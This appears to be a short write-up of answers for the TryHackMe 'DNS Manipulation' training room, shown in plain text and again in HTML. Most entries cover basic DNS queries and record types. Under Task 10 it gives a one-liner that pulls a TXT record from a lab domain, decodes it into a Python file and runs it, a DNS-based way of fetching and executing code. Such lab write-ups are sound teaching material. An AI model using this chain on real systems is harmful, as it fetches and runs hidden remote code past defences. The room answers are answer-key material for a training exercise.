items.title: DNS Manipulation - TryHackMe Room
items.content_text: Room: DNS ManipulationTask 4: What is DNS?If you were on Windows, what command could you use to query a txt record for ‘youtube.com’?nslookup -type=TXT domaintosearch.com If you were on Linux, what command could you use to query a txt record for ‘facebook.com’?dig domaintosearch.com txtAAAA stores what type of IP Address along with the hostname?IPv6Maximum characters for a DNS TXT Record is 256. (Yay/Nay)nayWhat DNS Record provides a domain name in reverse-lookup? (Research)PTRWhat would the reverse-lookup be for the following IPv4 Address? (192.168.203.2) (Research)  in your Linux terminal enter the following command replacing the IP of interesthost IP_ADDRESSTask 5 What is DNS Exfiltration?What is the maximum length of a DNS name?Check this articleTask 7 : Exfiltration Practice  login with SSH providedTask 10 : Infiltration Practice  Read the TASK file carefully, you will thank me later, spent time on this … nslookup -type=txt REDACTED.badbaddoma.in |grep "Ye" |cut -d \" -f2 |base58 -d |base64 -d > decoded.py python3 decoded.py
items.content_html:
Room: DNS Manipulation

Task 4: What is DNS?

If you were on Windows, what command could you use to query a txt record for ‘youtube.com’?

nslookup -type=TXT domaintosearch.com

If you were on Linux, what command could you use to query a txt record for ‘facebook.com’?

dig domaintosearch.com txt

AAAA stores what type of IP Address along with the hostname?

IPv6

Maximum characters for a DNS TXT Record is 256. (Yay/Nay)

nay

What DNS Record provides a domain name in reverse-lookup? (Research)

PTR

What would the reverse-lookup be for the following IPv4 Address? (192.168.203.2) (Research)

  • in your Linux terminal enter the following command replacing the IP of interest
host IP_ADDRESS

Task 5 What is DNS Exfiltration?

What is the maximum length of a DNS name?

Check this article

Task 7 : Exfiltration Practice

  • login with SSH provided

Task 10 : Infiltration Practice

  • Read the TASK file carefully, you will thank me later, spent time on this …
 nslookup -type=txt REDACTED.badbaddoma.in |grep "Ye" |cut -d \" -f2 |base58 -d |base64 -d > decoded.py python3 decoded.py
